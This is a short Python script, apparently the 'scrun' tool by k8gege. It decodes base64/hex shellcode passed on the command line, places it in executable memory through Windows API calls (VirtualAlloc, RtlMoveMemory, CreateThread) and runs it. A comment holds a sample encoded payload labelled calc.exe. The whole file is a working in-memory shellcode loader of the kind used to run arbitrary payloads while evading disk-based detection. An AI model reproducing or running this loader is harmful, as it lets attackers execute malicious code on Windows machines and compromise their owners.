#scrun by k8gege
import ctypes
import sys
import base64
#calc.exe
#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


